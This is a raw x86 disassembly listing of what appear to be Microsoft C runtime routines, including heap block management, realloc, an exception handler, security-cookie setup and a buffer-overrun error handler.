  427096:	dec    esi
  427097:	cmp    esi,0x3f
  42709a:	mov    DWORD PTR [ebp-0x8],ecx
  42709d:	jle    0x4270a2
  42709f:	push   0x3f
  4270a1:	pop    esi
  4270a2:	cmp    esi,edi
  4270a4:	je     0x4271ab
  4270aa:	mov    ecx,DWORD PTR [edx+0x4]
  4270ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4270b0:	jne    0x42710e
  4270b2:	cmp    edi,0x20
  4270b5:	mov    ebx,0x80000000
  4270ba:	jge    0x4270e2
  4270bc:	mov    ecx,edi
  4270be:	shr    ebx,cl
  4270c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c3:	lea    edi,[eax+edi*1+0x4]
  4270c7:	not    ebx
  4270c9:	mov    DWORD PTR [ebp-0x14],ebx
  4270cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270d4:	dec    BYTE PTR [edi]
  4270d6:	jne    0x42710b
  4270d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270db:	mov    ebx,DWORD PTR [ebp+0x8]
  4270de:	and    DWORD PTR [ebx],ecx
  4270e0:	jmp    0x42710e
  4270e2:	lea    ecx,[edi-0x20]
  4270e5:	shr    ebx,cl
  4270e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270ea:	lea    ecx,[eax+ecx*4+0xc4]
  4270f1:	lea    edi,[eax+edi*1+0x4]
  4270f5:	not    ebx
  4270f7:	and    DWORD PTR [ecx],ebx
  4270f9:	dec    BYTE PTR [edi]
  4270fb:	mov    DWORD PTR [ebp-0x14],ebx
  4270fe:	jne    0x42710b
  427100:	mov    ebx,DWORD PTR [ebp+0x8]
  427103:	mov    ecx,DWORD PTR [ebp-0x14]
  427106:	and    DWORD PTR [ebx+0x4],ecx
  427109:	jmp    0x42710e
  42710b:	mov    ebx,DWORD PTR [ebp+0x8]
  42710e:	cmp    DWORD PTR [ebp-0x8],0x0
  427112:	mov    ecx,DWORD PTR [edx+0x8]
  427115:	mov    edi,DWORD PTR [edx+0x4]
  427118:	mov    DWORD PTR [ecx+0x4],edi
  42711b:	mov    ecx,DWORD PTR [edx+0x4]
  42711e:	mov    edi,DWORD PTR [edx+0x8]
  427121:	mov    DWORD PTR [ecx+0x8],edi
  427124:	je     0x4271b7
  42712a:	mov    ecx,DWORD PTR [ebp-0xc]
  42712d:	lea    ecx,[ecx+esi*8]
  427130:	mov    edi,DWORD PTR [ecx+0x4]
  427133:	mov    DWORD PTR [edx+0x8],ecx
  427136:	mov    DWORD PTR [edx+0x4],edi
  427139:	mov    DWORD PTR [ecx+0x4],edx
  42713c:	mov    ecx,DWORD PTR [edx+0x4]
  42713f:	mov    DWORD PTR [ecx+0x8],edx
  427142:	mov    ecx,DWORD PTR [edx+0x4]
  427145:	cmp    ecx,DWORD PTR [edx+0x8]
  427148:	jne    0x4271a8
  42714a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42714e:	mov    BYTE PTR [ebp+0xb],cl
  427151:	inc    cl
  427153:	cmp    esi,0x20
  427156:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42715a:	jge    0x42717f
  42715c:	cmp    BYTE PTR [ebp+0xb],0x0
  427160:	jne    0x42716d
  427162:	mov    edi,0x80000000
  427167:	mov    ecx,esi
  427169:	shr    edi,cl
  42716b:	or     DWORD PTR [ebx],edi
  42716d:	mov    ecx,esi
  42716f:	mov    edi,0x80000000
  427174:	shr    edi,cl
  427176:	mov    ecx,DWORD PTR [ebp-0x4]
  427179:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42717d:	jmp    0x4271a8
  42717f:	cmp    BYTE PTR [ebp+0xb],0x0
  427183:	jne    0x427192
  427185:	lea    ecx,[esi-0x20]
  427188:	mov    edi,0x80000000
  42718d:	shr    edi,cl
  42718f:	or     DWORD PTR [ebx+0x4],edi
  427192:	mov    ecx,DWORD PTR [ebp-0x4]
  427195:	lea    edi,[eax+ecx*4+0xc4]
  42719c:	lea    ecx,[esi-0x20]
  42719f:	mov    esi,0x80000000
  4271a4:	shr    esi,cl
  4271a6:	or     DWORD PTR [edi],esi
  4271a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ab:	test   ecx,ecx
  4271ad:	je     0x4271ba
  4271af:	mov    DWORD PTR [edx],ecx
  4271b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271b5:	jmp    0x4271ba
  4271b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ba:	mov    esi,DWORD PTR [ebp-0x10]
  4271bd:	add    edx,ecx
  4271bf:	lea    ecx,[esi+0x1]
  4271c2:	mov    DWORD PTR [edx],ecx
  4271c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271c8:	mov    esi,DWORD PTR [ebp-0xc]
  4271cb:	mov    ecx,DWORD PTR [esi]
  4271cd:	test   ecx,ecx
  4271cf:	lea    edi,[ecx+0x1]
  4271d2:	mov    DWORD PTR [esi],edi
  4271d4:	jne    0x4271f0
  4271d6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271dc:	jne    0x4271f0
  4271de:	mov    ecx,DWORD PTR [ebp-0x4]
  4271e1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271e7:	jne    0x4271f0
  4271e9:	and    DWORD PTR ds:0x45def8,0x0
  4271f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f3:	mov    DWORD PTR [eax],ecx
  4271f5:	lea    eax,[edx+0x4]
  4271f8:	pop    edi
  4271f9:	pop    esi
  4271fa:	pop    ebx
  4271fb:	leave  
  4271fc:	ret    
  4271fd:	int3   
  4271fe:	int3   
  4271ff:	int3   
  427200:	push   esi
  427201:	inc    ebx
  427202:	xor    dh,BYTE PTR [eax]
  427204:	pop    eax
  427205:	inc    ebx
  427206:	xor    BYTE PTR [eax],dh
  427208:	push   ebp
  427209:	mov    ebp,esp
  42720b:	sub    esp,0x8
  42720e:	push   ebx
  42720f:	push   esi
  427210:	push   edi
  427211:	push   ebp
  427212:	cld    
  427213:	mov    ebx,DWORD PTR [ebp+0xc]
  427216:	mov    eax,DWORD PTR [ebp+0x8]
  427219:	test   DWORD PTR [eax+0x4],0x6
  427220:	jne    0x4272a8
  427226:	mov    DWORD PTR [ebp-0x8],eax
  427229:	mov    eax,DWORD PTR [ebp+0x10]
  42722c:	mov    DWORD PTR [ebp-0x4],eax
  42722f:	lea    eax,[ebp-0x8]
  427232:	mov    DWORD PTR [ebx-0x4],eax
  427235:	mov    esi,DWORD PTR [ebx+0xc]
  427238:	mov    edi,DWORD PTR [ebx+0x8]
  42723b:	cmp    esi,0xffffffff
  42723e:	je     0x4272a1
  427240:	lea    ecx,[esi+esi*2]
  427243:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427248:	je     0x42728f
  42724a:	push   esi
  42724b:	push   ebp
  42724c:	lea    ebp,[ebx+0x10]
  42724f:	call   DWORD PTR [edi+ecx*4+0x4]
  427253:	pop    ebp
  427254:	pop    esi
  427255:	mov    ebx,DWORD PTR [ebp+0xc]
  427258:	or     eax,eax
  42725a:	je     0x42728f
  42725c:	js     0x42729a
  42725e:	mov    edi,DWORD PTR [ebx+0x8]
  427261:	push   ebx
  427262:	call   0x428190
  427267:	add    esp,0x4
  42726a:	lea    ebp,[ebx+0x10]
  42726d:	push   esi
  42726e:	push   ebx
  42726f:	call   0x4281d2
  427274:	add    esp,0x8
  427277:	lea    ecx,[esi+esi*2]
  42727a:	push   0x1
  42727c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427280:	call   0x428266
  427285:	mov    eax,DWORD PTR [edi+ecx*4]
  427288:	mov    DWORD PTR [ebx+0xc],eax
  42728b:	call   DWORD PTR [edi+ecx*4+0x8]
  42728f:	mov    edi,DWORD PTR [ebx+0x8]
  427292:	lea    ecx,[esi+esi*2]
  427295:	mov    esi,DWORD PTR [edi+ecx*4]
  427298:	jmp    0x42723b
  42729a:	mov    eax,0x0
  42729f:	jmp    0x4272bd
  4272a1:	mov    eax,0x1
  4272a6:	jmp    0x4272bd
  4272a8:	push   ebp
  4272a9:	lea    ebp,[ebx+0x10]
  4272ac:	push   0xffffffff
  4272ae:	push   ebx
  4272af:	call   0x4281d2
  4272b4:	add    esp,0x8
  4272b7:	pop    ebp
  4272b8:	mov    eax,0x1
  4272bd:	pop    ebp
  4272be:	pop    edi
  4272bf:	pop    esi
  4272c0:	pop    ebx
  4272c1:	mov    esp,ebp
  4272c3:	pop    ebp
  4272c4:	ret    
  4272c5:	push   ebp
  4272c6:	mov    ecx,DWORD PTR [esp+0x8]
  4272ca:	mov    ebp,DWORD PTR [ecx]
  4272cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272cf:	push   eax
  4272d0:	mov    eax,DWORD PTR [ecx+0x18]
  4272d3:	push   eax
  4272d4:	call   0x4281d2
  4272d9:	add    esp,0x8
  4272dc:	pop    ebp
  4272dd:	ret    0x4
  4272e0:	call   0x4251f3
  4272e5:	add    eax,0x8
  4272e8:	ret    
  4272e9:	push   0x14
  4272eb:	push   0x429878
  4272f0:	call   0x425340
  4272f5:	mov    edi,DWORD PTR [ebp+0x8]
  4272f8:	xor    ebx,ebx
  4272fa:	cmp    edi,ebx
  4272fc:	jne    0x42730c
  4272fe:	push   DWORD PTR [ebp+0xc]
  427301:	call   0x426062
  427306:	pop    ecx
  427307:	jmp    0x427490
  42730c:	mov    esi,DWORD PTR [ebp+0xc]
  42730f:	cmp    esi,ebx
  427311:	jne    0x42731f
  427313:	push   edi
  427314:	call   0x425f4a
  427319:	pop    ecx
  42731a:	jmp    0x42748e
  42731f:	cmp    DWORD PTR ds:0x45e144,0x3
  427326:	jne    0x42745a
  42732c:	mov    DWORD PTR [ebp-0x1c],ebx
  42732f:	cmp    esi,0xffffffe0
  427332:	ja     0x427429
  427338:	push   0x4
  42733a:	call   0x4254ff
  42733f:	pop    ecx
  427340:	mov    DWORD PTR [ebp-0x4],ebx
  427343:	push   edi
  427344:	call   0x426722
  427349:	pop    ecx
  42734a:	mov    DWORD PTR [ebp-0x20],eax
  42734d:	cmp    eax,ebx
  42734f:	je     0x4273f9
  427355:	cmp    esi,DWORD PTR ds:0x45df04
  42735b:	ja     0x4273a9
  42735d:	push   esi
  42735e:	push   edi
  42735f:	push   eax
  427360:	call   0x426c22
  427365:	add    esp,0xc
  427368:	test   eax,eax
  42736a:	je     0x427371
  42736c:	mov    DWORD PTR [ebp-0x1c],edi
  42736f:	jmp    0x4273a9
  427371:	push   esi
  427372:	call   0x426f01
  427377:	pop    ecx
  427378:	mov    DWORD PTR [ebp-0x1c],eax
  42737b:	cmp    eax,ebx
  42737d:	je     0x4273a9
  42737f:	mov    eax,DWORD PTR [edi-0x4]
  427382:	dec    eax
  427383:	mov    DWORD PTR [ebp-0x24],eax
  427386:	cmp    eax,esi
  427388:	jb     0x42738c
  42738a:	mov    eax,esi
  42738c:	push   eax
  42738d:	push   edi
  42738e:	push   DWORD PTR [ebp-0x1c]
  427391:	call   0x426080
  427396:	push   edi
  427397:	call   0x426722
  42739c:	mov    DWORD PTR [ebp-0x20],eax
  42739f:	push   edi
  4273a0:	push   eax
  4273a1:	call   0x42674d
  4273a6:	add    esp,0x18
  4273a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273ac:	jne    0x4273f9
  4273ae:	cmp    esi,ebx
  4273b0:	jne    0x4273b8
  4273b2:	xor    esi,esi
  4273b4:	inc    esi
  4273b5:	mov    DWORD PTR [ebp+0xc],esi
  4273b8:	add    esi,0xf
  4273bb:	and    esi,0xfffffff0
  4273be:	mov    DWORD PTR [ebp+0xc],esi
  4273c1:	push   esi
  4273c2:	push   ebx
  4273c3:	push   DWORD PTR ds:0x45e140
  4273c9:	call   DWORD PTR ds:0x429030
  4273cf:	mov    DWORD PTR [ebp-0x1c],eax
  4273d2:	cmp    eax,ebx
  4273d4:	je     0x4273f9
  4273d6:	mov    eax,DWORD PTR [edi-0x4]
  4273d9:	dec    eax
  4273da:	mov    DWORD PTR [ebp-0x24],eax
  4273dd:	cmp    eax,esi
  4273df:	jb     0x4273e3
  4273e1:	mov    eax,esi
  4273e3:	push   eax
  4273e4:	push   edi
  4273e5:	push   DWORD PTR [ebp-0x1c]
  4273e8:	call   0x426080
  4273ed:	push   edi
  4273ee:	push   DWORD PTR [ebp-0x20]
  4273f1:	call   0x42674d
  4273f6:	add    esp,0x14
  4273f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4273fd:	call   0x427451
  427402:	cmp    DWORD PTR [ebp-0x20],ebx
  427405:	jne    0x427429
  427407:	cmp    esi,ebx
  427409:	jne    0x42740e
  42740b:	xor    esi,esi
  42740d:	inc    esi
  42740e:	add    esi,0xf
  427411:	and    esi,0xfffffff0
  427414:	mov    DWORD PTR [ebp+0xc],esi
  427417:	push   esi
  427418:	push   edi
  427419:	push   ebx
  42741a:	push   DWORD PTR ds:0x45e140
  427420:	call   DWORD PTR ds:0x4290d0
  427426:	mov    DWORD PTR [ebp-0x1c],eax
  427429:	mov    eax,DWORD PTR [ebp-0x1c]
  42742c:	cmp    eax,ebx
  42742e:	jne    0x427490
  427430:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427436:	je     0x427490
  427438:	push   esi
  427439:	call   0x427c22
  42743e:	pop    ecx
  42743f:	test   eax,eax
  427441:	jne    0x42732c
  427447:	jmp    0x42748e
  427449:	xor    ebx,ebx
  42744b:	mov    esi,DWORD PTR [ebp+0xc]
  42744e:	mov    edi,DWORD PTR [ebp+0x8]
  427451:	push   0x4
  427453:	call   0x42546b
  427458:	pop    ecx
  427459:	ret    
  42745a:	xor    eax,eax
  42745c:	cmp    esi,0xffffffe0
  42745f:	ja     0x427477
  427461:	cmp    esi,ebx
  427463:	jne    0x427468
  427465:	xor    esi,esi
  427467:	inc    esi
  427468:	push   esi
  427469:	push   edi
  42746a:	push   ebx
  42746b:	push   DWORD PTR ds:0x45e140
  427471:	call   DWORD PTR ds:0x4290d0
  427477:	cmp    eax,ebx
  427479:	jne    0x427490
  42747b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427481:	je     0x427490
  427483:	push   esi
  427484:	call   0x427c22
  427489:	pop    ecx
  42748a:	test   eax,eax
  42748c:	jne    0x42745a
  42748e:	xor    eax,eax
  427490:	call   0x42537b
  427495:	ret    
  427496:	push   0x10
  427498:	push   0x429888
  42749d:	call   0x425340
  4274a2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274a9:	jne    0x4274e5
  4274ab:	push   0x4
  4274ad:	call   0x4254ff
  4274b2:	pop    ecx
  4274b3:	and    DWORD PTR [ebp-0x4],0x0
  4274b7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ba:	push   esi
  4274bb:	call   0x426722
  4274c0:	pop    ecx
  4274c1:	mov    DWORD PTR [ebp-0x1c],eax
  4274c4:	test   eax,eax
  4274c6:	je     0x4274d3
  4274c8:	mov    esi,DWORD PTR [esi-0x4]
  4274cb:	sub    esi,0x9
  4274ce:	mov    DWORD PTR [ebp-0x20],esi
  4274d1:	jmp    0x4274d6
  4274d3:	mov    esi,DWORD PTR [ebp-0x20]
  4274d6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274da:	call   0x427503
  4274df:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274e3:	jne    0x4274f8
  4274e5:	push   DWORD PTR [ebp+0x8]
  4274e8:	push   0x0
  4274ea:	push   DWORD PTR ds:0x45e140
  4274f0:	call   DWORD PTR ds:0x4290d4
  4274f6:	mov    esi,eax
  4274f8:	mov    eax,esi
  4274fa:	call   0x42537b
  4274ff:	ret    
  427500:	mov    esi,DWORD PTR [ebp-0x20]
  427503:	push   0x4
  427505:	call   0x42546b
  42750a:	pop    ecx
  42750b:	ret    
  42750c:	push   ebp
  42750d:	mov    ebp,esp
  42750f:	sub    esp,0x10
  427512:	push   esi
  427513:	lea    eax,[ebp-0x8]
  427516:	push   eax
  427517:	call   DWORD PTR ds:0x4290e4
  42751d:	mov    esi,DWORD PTR [ebp-0x4]
  427520:	xor    esi,DWORD PTR [ebp-0x8]
  427523:	call   DWORD PTR ds:0x4290e0
  427529:	xor    esi,eax
  42752b:	call   DWORD PTR ds:0x429098
  427531:	xor    esi,eax
  427533:	call   DWORD PTR ds:0x4290dc
  427539:	xor    esi,eax
  42753b:	lea    eax,[ebp-0x10]
  42753e:	push   eax
  42753f:	call   DWORD PTR ds:0x4290d8
  427545:	mov    eax,DWORD PTR [ebp-0xc]
  427548:	xor    eax,DWORD PTR [ebp-0x10]
  42754b:	xor    esi,eax
  42754d:	mov    DWORD PTR ds:0x45d430,esi
  427553:	jne    0x42755f
  427555:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42755f:	pop    esi
  427560:	leave  
  427561:	ret    
  427562:	push   0x118
  427567:	push   0x429a38
  42756c:	call   0x425340
  427571:	mov    eax,ds:0x45d430
  427576:	xor    eax,DWORD PTR [ebp+0x4]
  427579:	mov    DWORD PTR [ebp-0x1c],eax
  42757c:	mov    eax,ds:0x45dd98
  427581:	xor    ecx,ecx
  427583:	cmp    eax,ecx
  427585:	je     0x4275a6
  427587:	mov    DWORD PTR [ebp-0x4],ecx
  42758a:	push   DWORD PTR [ebp+0xc]
  42758d:	push   DWORD PTR [ebp+0x8]
  427590:	call   eax
  427592:	pop    ecx
  427593:	pop    ecx
  427594:	or     DWORD PTR [ebp-0x4],0xffffffff
  427598:	jmp    0x4276a4
  42759d:	xor    eax,eax
  42759f:	inc    eax
  4275a0:	ret    
  4275a1:	mov    esp,DWORD PTR [ebp-0x18]
  4275a4:	jmp    0x427594
  4275a6:	mov    eax,DWORD PTR [ebp+0x8]
  4275a9:	dec    eax
  4275aa:	je     0x4275bf
  4275ac:	mov    edi,0x429a14
  4275b1:	mov    DWORD PTR [ebp-0x20],0x429960
  4275b8:	mov    esi,0xd4
  4275bd:	jmp    0x4275d0
  4275bf:	mov    edi,0x429940
  4275c4:	mov    DWORD PTR [ebp-0x20],0x4298a0
  4275cb:	mov    esi,0xb9
  4275d0:	mov    BYTE PTR [ebp-0x24],cl
  4275d3:	push   0x104
  4275d8:	lea    eax,[ebp-0x128]
  4275de:	push   eax
  4275df:	push   ecx
  4275e0:	call   DWORD PTR ds:0x429068
  4275e6:	test   eax,eax
  4275e8:	jne    0x4275fd
  4275ea:	push   0x429594
  4275ef:	lea    eax,[ebp-0x128]
  4275f5:	push   eax
  4275f6:	call   0x425720
  4275fb:	pop    ecx
  4275fc:	pop    ecx
  4275fd:	lea    ebx,[ebp-0x128]
  427603:	lea    eax,[ebp-0x128]
  427609:	push   eax
  42760a:	call   0x425950
  42760f:	pop    ecx
  427610:	add    eax,0xb
  427613:	cmp    eax,0x3c
  427616:	jbe    0x427641
  427618:	lea    eax,[ebp-0x128]
  42761e:	push   eax
  42761f:	call   0x425950
  427624:	mov    ebx,eax
  427626:	lea    eax,[ebp-0x128]
  42762c:	sub    eax,0x31
  42762f:	add    ebx,eax
  427631:	push   0x3
  427633:	push   0x429590
  427638:	push   ebx
  427639:	call   0x425820
  42763e:	add    esp,0x10
  427641:	push   ebx
  427642:	call   0x425950
  427647:	pop    ecx
  427648:	lea    eax,[eax+esi*1+0xc]
  42764c:	add    eax,0x3
  42764f:	and    eax,0xfffffffc
  427652:	call   0x425390
  427657:	mov    DWORD PTR [ebp-0x18],esp
  42765a:	mov    esi,esp
  42765c:	push   edi
  42765d:	push   esi
  42765e:	call   0x425720
  427663:	mov    edi,0x429570
  427668:	push   edi
  427669:	push   esi
  42766a:	call   0x425730
  42766f:	push   0x429894
  427674:	push   esi
  427675:	call   0x425730
  42767a:	push   ebx
  42767b:	push   esi
  42767c:	call   0x425730
  427681:	push   edi
  427682:	push   esi
  427683:	call   0x425730
  427688:	push   DWORD PTR [ebp-0x20]
  42768b:	push   esi
  42768c:	call   0x425730
  427691:	push   0x12010
  427696:	push   0x429548
  42769b:	push   esi
  42769c:	call   0x425622
  4276a1:	add    esp,0x3c
  4276a4:	push   0x3
  4276a6:	call   0x4247ac
  4276ab:	int3   
  4276ac:	push   0x38
  4276ae:	push   0x429e58
  4276b3:	call   0x425340
  4276b8:	xor    ebx,ebx
  4276ba:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276c0:	jne    0x4276fa
  4276c2:	push   ebx
  4276c3:	push   ebx
  4276c4:	xor    esi,esi
  4276c6:	inc    esi
  4276c7:	push   esi
  4276c8:	push   0x429e54
  4276cd:	push   0x100
  4276d2:	push   ebx
  4276d3:	call   DWORD PTR ds:0x4290f0
  4276d9:	test   eax,eax
  4276db:	je     0x4276e5
  4276dd:	mov    DWORD PTR ds:0x45ddbc,esi
  4276e3:	jmp    0x4276fa
  4276e5:	call   DWORD PTR ds:0x429044
  4276eb:	cmp    eax,0x78
  4276ee:	jne    0x4276fa
  4276f0:	mov    DWORD PTR ds:0x45ddbc,0x2
  4276fa:	cmp    DWORD PTR [ebp+0x14],ebx
  4276fd:	jle    0x42771a
  4276ff:	mov    ecx,DWORD PTR [ebp+0x14]
  427702:	mov    eax,DWORD PTR [ebp+0x10]
  427705:	dec    ecx
  427706:	cmp    BYTE PTR [eax],bl
  427708:	je     0x427712
  42770a:	inc    eax
  42770b:	cmp    ecx,ebx
  42770d:	jne    0x427705
  42770f:	or     ecx,0xffffffff
  427712:	or     eax,0xffffffff
  427715:	sub    eax,ecx
  427717:	add    DWORD PTR [ebp+0x14],eax
  42771a:	mov    eax,ds:0x45ddbc
  42771f:	cmp    eax,0x2
  427722:	je     0x427904
  427728:	cmp    eax,ebx
  42772a:	je     0x427904
  427730:	cmp    eax,0x1
  427733:	jne    0x427937
  427739:	xor    edi,edi
  42773b:	mov    DWORD PTR [ebp-0x1c],edi
  42773e:	mov    DWORD PTR [ebp-0x20],ebx
  427741:	mov    DWORD PTR [ebp-0x24],ebx
  427744:	cmp    DWORD PTR [ebp+0x20],ebx
  427747:	jne    0x427751
  427749:	mov    eax,ds:0x45ddb4
  42774e:	mov    DWORD PTR [ebp+0x20],eax
  427751:	push   ebx
  427752:	push   ebx
  427753:	push   DWORD PTR [ebp+0x14]
  427756:	push   DWORD PTR [ebp+0x10]
  427759:	xor    eax,eax
  42775b:	cmp    DWORD PTR [ebp+0x24],ebx
  42775e:	setne  al
  427761:	lea    eax,[eax*8+0x1]
  427768:	push   eax
  427769:	push   DWORD PTR [ebp+0x20]
  42776c:	call   DWORD PTR ds:0x4290ec
  427772:	mov    esi,eax
  427774:	mov    DWORD PTR [ebp-0x28],esi
  427777:	cmp    esi,ebx
  427779:	je     0x427937
  42777f:	mov    DWORD PTR [ebp-0x4],0x1
  427786:	lea    eax,[esi+esi*1]
  427789:	add    eax,0x3
  42778c:	and    eax,0xfffffffc
  42778f:	call   0x425390
  427794:	mov    DWORD PTR [ebp-0x18],esp
  427797:	mov    eax,esp
  427799:	mov    DWORD PTR [ebp-0x2c],eax
  42779c:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277a0:	jmp    0x4277bd
  4277a2:	xor    eax,eax
  4277a4:	inc    eax
  4277a5:	ret    
  4277a6:	mov    esp,DWORD PTR [ebp-0x18]
  4277a9:	call   0x4287d5
  4277ae:	xor    ebx,ebx
  4277b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277b3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ba:	mov    esi,DWORD PTR [ebp-0x28]
  4277bd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277c0:	jne    0x4277de
  4277c2:	lea    eax,[esi+esi*1]
  4277c5:	push   eax
  4277c6:	call   0x426062
  4277cb:	pop    ecx
  4277cc:	mov    DWORD PTR [ebp-0x2c],eax
  4277cf:	cmp    eax,ebx
  4277d1:	je     0x427937
  4277d7:	mov    DWORD PTR [ebp-0x20],0x1
  4277de:	push   esi
  4277df:	push   DWORD PTR [ebp-0x2c]
  4277e2:	push   DWORD PTR [ebp+0x14]
  4277e5:	push   DWORD PTR [ebp+0x10]
  4277e8:	push   0x1
  4277ea:	push   DWORD PTR [ebp+0x20]
  4277ed:	call   DWORD PTR ds:0x4290ec
  4277f3:	test   eax,eax
  4277f5:	je     0x4278e1
  4277fb:	push   ebx
  4277fc:	push   ebx
  4277fd:	push   esi
  4277fe:	push   DWORD PTR [ebp-0x2c]
  427801:	push   DWORD PTR [ebp+0xc]
  427804:	push   DWORD PTR [ebp+0x8]
  427807:	call   DWORD PTR ds:0x4290f0
  42780d:	mov    edi,eax
  42780f:	mov    DWORD PTR [ebp-0x1c],edi
  427812:	cmp    edi,ebx
  427814:	je     0x4278e1
  42781a:	test   BYTE PTR [ebp+0xd],0x4
  42781e:	je     0x42784d
  427820:	cmp    DWORD PTR [ebp+0x1c],ebx
  427823:	je     0x4278e1
  427829:	cmp    edi,DWORD PTR [ebp+0x1c]
  42782c:	jg     0x4278e1
  427832:	push   DWORD PTR [ebp+0x1c]
  427835:	push   DWORD PTR [ebp+0x18]
  427838:	push   esi
  427839:	push   DWORD PTR [ebp-0x2c]
  42783c:	push   DWORD PTR [ebp+0xc]
  42783f:	push   DWORD PTR [ebp+0x8]
  427842:	call   DWORD PTR ds:0x4290f0
  427848:	jmp    0x4278e1
  42784d:	mov    DWORD PTR [ebp-0x4],0x2
  427854:	lea    eax,[edi+edi*1]
  427857:	add    eax,0x3
  42785a:	and    eax,0xfffffffc
  42785d:	call   0x425390
  427862:	mov    DWORD PTR [ebp-0x18],esp
  427865:	mov    eax,esp
  427867:	mov    DWORD PTR [ebp-0x30],eax
  42786a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42786e:	jmp    0x42788b
  427870:	xor    eax,eax
  427872:	inc    eax
  427873:	ret    
  427874:	mov    esp,DWORD PTR [ebp-0x18]
  427877:	call   0x4287d5
  42787c:	xor    ebx,ebx
  42787e:	mov    DWORD PTR [ebp-0x30],ebx
  427881:	or     DWORD PTR [ebp-0x4],0xffffffff
  427885:	mov    edi,DWORD PTR [ebp-0x1c]
  427888:	mov    esi,DWORD PTR [ebp-0x28]
  42788b:	cmp    DWORD PTR [ebp-0x30],ebx
  42788e:	jne    0x4278a8
  427890:	lea    eax,[edi+edi*1]
  427893:	push   eax
  427894:	call   0x426062
  427899:	pop    ecx
  42789a:	mov    DWORD PTR [ebp-0x30],eax
  42789d:	cmp    eax,ebx
  42789f:	je     0x4278e1
  4278a1:	mov    DWORD PTR [ebp-0x24],0x1
  4278a8:	push   edi
  4278a9:	push   DWORD PTR [ebp-0x30]
  4278ac:	push   esi
  4278ad:	push   DWORD PTR [ebp-0x2c]
  4278b0:	push   DWORD PTR [ebp+0xc]
  4278b3:	push   DWORD PTR [ebp+0x8]
  4278b6:	call   DWORD PTR ds:0x4290f0
  4278bc:	test   eax,eax
  4278be:	je     0x4278e1
  4278c0:	push   ebx
  4278c1:	push   ebx
  4278c2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278c5:	jne    0x4278cb
  4278c7:	push   ebx
  4278c8:	push   ebx
  4278c9:	jmp    0x4278d1
  4278cb:	push   DWORD PTR [ebp+0x1c]
  4278ce:	push   DWORD PTR [ebp+0x18]
  4278d1:	push   edi
  4278d2:	push   DWORD PTR [ebp-0x30]
  4278d5:	push   ebx
  4278d6:	push   DWORD PTR [ebp+0x20]
  4278d9:	call   DWORD PTR ds:0x42907c
  4278df:	mov    edi,eax
  4278e1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278e4:	je     0x4278ef
  4278e6:	push   DWORD PTR [ebp-0x30]
  4278e9:	call   0x425f4a
  4278ee:	pop    ecx
  4278ef:	cmp    DWORD PTR [ebp-0x20],ebx
  4278f2:	je     0x4278fd
  4278f4:	push   DWORD PTR [ebp-0x2c]
  4278f7:	call   0x425f4a
  4278fc:	pop    ecx
  4278fd:	mov    eax,edi
  4278ff:	jmp    0x427a5f
  427904:	mov    DWORD PTR [ebp-0x34],ebx
  427907:	xor    edi,edi
  427909:	mov    DWORD PTR [ebp-0x38],ebx
  42790c:	cmp    DWORD PTR [ebp+0x8],ebx
  42790f:	jne    0x427919
  427911:	mov    eax,ds:0x45dda4
  427916:	mov    DWORD PTR [ebp+0x8],eax
  427919:	cmp    DWORD PTR [ebp+0x20],ebx
  42791c:	jne    0x427926
  42791e:	mov    eax,ds:0x45ddb4
  427923:	mov    DWORD PTR [ebp+0x20],eax
  427926:	push   DWORD PTR [ebp+0x8]
  427929:	call   0x4285bd
  42792e:	pop    ecx
  42792f:	mov    DWORD PTR [ebp-0x3c],eax
  427932:	cmp    eax,0xffffffff
  427935:	jne    0x42793e
  427937:	xor    eax,eax
  427939:	jmp    0x427a5f
  42793e:	cmp    eax,DWORD PTR [ebp+0x20]
  427941:	je     0x427a35
  427947:	push   ebx
  427948:	push   ebx
  427949:	lea    ecx,[ebp+0x14]
  42794c:	push   ecx
  42794d:	push   DWORD PTR [ebp+0x10]
  427950:	push   eax
  427951:	push   DWORD PTR [ebp+0x20]
  427954:	call   0x428606
  427959:	add    esp,0x18
  42795c:	mov    DWORD PTR [ebp-0x34],eax
  42795f:	cmp    eax,ebx
  427961:	je     0x427937
  427963:	push   ebx
  427964:	push   ebx
  427965:	push   DWORD PTR [ebp+0x14]
  427968:	push   eax
  427969:	push   DWORD PTR [ebp+0xc]
  42796c:	push   DWORD PTR [ebp+0x8]
  42796f:	call   DWORD PTR ds:0x4290e8
  427975:	mov    esi,eax
  427977:	mov    DWORD PTR [ebp-0x40],esi
  42797a:	cmp    esi,ebx
  42797c:	je     0x427a24
  427982:	mov    DWORD PTR [ebp-0x4],ebx
  427985:	add    eax,0x3
  427988:	and    eax,0xfffffffc
  42798b:	call   0x425390
